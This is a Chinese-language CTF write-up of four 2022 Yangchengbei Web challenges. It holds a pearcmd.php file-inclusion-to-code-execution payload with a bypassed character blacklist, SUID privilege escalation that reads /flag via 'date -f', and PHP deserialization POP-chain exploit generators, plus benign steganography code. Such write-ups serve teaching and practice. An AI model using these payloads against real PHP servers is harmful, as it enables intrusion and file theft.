# 2022 羊城杯竞赛 Web 题目解析

原文 https://www.ctfiot.com/58309.html （看雪 ArT1_）

## Q1: rce_me
```http
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```
- 绕过黑名单 `< ? $ [ ] ; eval > @ _ create install pear`
- `pearcmd.php` 是 PEAR 安装的命令行入口
- `config-create` 创建配置时把 `<` 内容写到 /tmp/hello.php
- `include $file` 触发

**提权：**
```bash
find / -perm -u=s -type f 2>/dev/null
/usr/bin/date -f /flag
```
- `date -f` 读文件当日期格式解析 → 报错显示内容

## Q2: easy_serialize
```php
class yang {
    public $y1;
    public function __construct() { $this->y1->magic(); }
    public function __tostring() { ($this->y1)(); }
    public function hint() {
        include_once('hint.php');
        if (isset($_GET['file'])) {
            $file = $_GET['file'];
            if (preg_match("/$hey_mean_then/is", $file)) die("nonono");
            include_once($file);
        }
    }
}
class cheng {
    public $c1;
    public function __wakeup() { $this->c1->flag = 'flag'; }
    public function __invoke() { $this->c1->hint(); }
}
class bei {
    public $b1;
    public function __set($k1, $k2) { print $this->b1; }
    public function __call($n1, $n2) { echo $this->b1; }
}
```
- 链：`cheng::__wakeup → bei::__set → yang::__tostring`

```php
class yang { public $y1; public function __construct($y1) { $this->y1 = $y1; } }
class cheng { public $c1; public function __construct($c1) { $this->c1 = $c1; } }
class bei { public $b1; public function __construct($b1) { $this->b1 = $b1; } }
$ya = new cheng(new bei(new yang('phpinfo')));
echo urlencode(serialize($ya));
```

## Q3: Pop
```php
class Fun {
    private $func = 'call_user_func_array';
    public function __call($f, $p) { call_user_func($this->func, $f, $p); }
    public function __wakeup() { $this->func = ''; die("Don't serialize me"); }
}
class Test {
    public function getFlag() { system("cat /flag?"); }
    public function __call($f, $p) { phpinfo(); }
    public function __wakeup() { echo "serialize me?"; }
}
class A {
    private $a;
    public function __get($p) {
        if (preg_match("/Test/", get_class($this->a))) {
            return "No test in Prod";
        }
        return $this->a->$p();
    }
}
class B {
    public $p;
    public function __destruct() {
        $p = $this->p;
        echo $this->a->$p;
    }
}
```
- 链：`B::__destruct → A::__get → Fun::__call → Test::getFlag`

**绕过 throw Exception：**
```php
$b = new B(new A(new Fun()), "Test::getFlag");
$serstr = serialize($b);
$arr = array($b, null);
$serstr = serialize($arr);
$serstr = str_replace(":0:{}", ":1:{}", $serstr);
$serstr = str_replace(":1;N", ":0;N", $serstr);
echo urlencode($serstr);
```

## Q4: stego (文本转图像)
```python
from PIL import Image
import math

def encode(text):
    str_len = len(text)
    width = math.ceil(str_len ** 0.5)
    im = Image.new("RGB", (width, width), 0x0)
    x, y = 0, 0
    for i in text:
        index = ord(i)
        rgb = (0, (index & 0xFF00) >> 8, index & 0xFF)
        im.putpixel((x, y), rgb)
        if x == width - 1:
            x = 0; y += 1
        else:
            x += 1
    return im

with open("829962.txt", encoding="gbk") as f:
    all_text = f.read()
im = encode(all_text)
im.save("out.bmp")
```

**解码：**
```python
from PIL import Image
img = Image.open('out.bmp')
x, y = img.size
flag = ""
with open('ans.txt') as f:
    for i in range(x):
        for j in range(y):
            pix = img.getpixel((j, i))
            index = (pix[1] << 8) + pix[2]
            flag = flag + chr(index)
# 提取 base32 字符 ZMJTPM33TMFGPA3STZ2JVBYSZRMGBZELT44QDLEET5GQTMEITIFJZZOMTH4K2===
```
